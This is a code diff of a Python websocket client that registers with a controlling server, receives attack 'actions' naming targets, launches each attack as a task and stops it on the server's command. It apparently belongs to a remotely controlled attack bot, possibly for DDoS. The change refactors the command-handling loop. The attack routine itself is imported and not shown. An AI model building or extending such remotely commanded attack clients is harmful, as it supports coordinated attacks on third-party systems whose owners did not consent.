@@ -2,17 +2,42 @@ import logging
 import sys
 import asyncio
 
+from asyncio import Queue
 from websockets.exceptions import ConnectionClosed
+from sanic.server.websockets.impl import WebsocketImplProtocol
 
-from scripts.services.communication_services import wait_for_command_from_server, \
-    get_action, \
-    is_needed_to_stop
+from lib.utils import wait_for
+from scripts.services.communication_services import wait_for_actions_from_server, dispatch_action, is_needed_to_stop
 from scripts.services.connect_services import connect, register
-from scripts.services.attack_services import start_attack
+from scripts.exceptions import CannotGetActionFromServerException
 
 
-logging.basicConfig(stream=sys.stdout, level=logging.INFO)
+logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='{%(filename)s:%(lineno)d} %(levelname)s - %(message)s')
 logger = logging.getLogger(__package__)
+
+
+async def try_finish_attack_task(attack_task: asyncio.Task, actions_queue: Queue):
+    """Waits until <attack_task> is finished or server communicates to stop"""
+    while True:
+        new_action = await wait_for(actions_queue.get(), 0.1)
+
+        if new_action is not None and await is_needed_to_stop(new_action):
+            logger.info(f"server communicated to stop attack on {new_action.target}")
+            attack_task.cancel()
+            return
+
+        if attack_task.done():
+            logger.info(f"attack stopped")
+            return
+
+
+async def handle_actions_from_server(websocket: WebsocketImplProtocol, actions_queue: Queue):
+    while True:
+        action = await actions_queue.get()
+        logger.info(f"Starting attack on: {action.target}")
+
+        attack_task = asyncio.create_task(dispatch_action(action))
+        await try_finish_attack_task(attack_task, actions_queue)
 
 
 async def start(addr: str):
@@ -28,23 +53,18 @@ async def start(addr: str):
         return -2
     logger.info(f"Registered on host server: {addr}")
 
-    action = await get_action(websocket)
-    logger.info(f"Starting attack on: {action.target}")
+    actions = Queue()
 
     try:
-        attack = await start_attack(action.target)
-        while True:
-            if attack.done():
-                logger.info(f"attack stopped on {action.target}")
-                break
-            command = await wait_for_command_from_server(websocket)
-            if command is not None and await is_needed_to_stop(command):
-                logger.info(f"server communicated to stop attack on {action.target}")
-                attack.cancel()
-                break
+        actions_getter_task = asyncio.create_task(wait_for_actions_from_server(websocket, actions))
+        actions_handler_task = asyncio.create_task(handle_actions_from_server(websocket, actions))
+        await asyncio.gather(*[actions_getter_task, actions_handler_task])
 
     except ConnectionClosed as e:
         logger.error(f"Connection was closed: {e}")
+    except CannotGetActionFromServerException as e:
+        logger.error(f"Cannot get action from server: {e}")
+
     finally:
         await websocket.close()
 
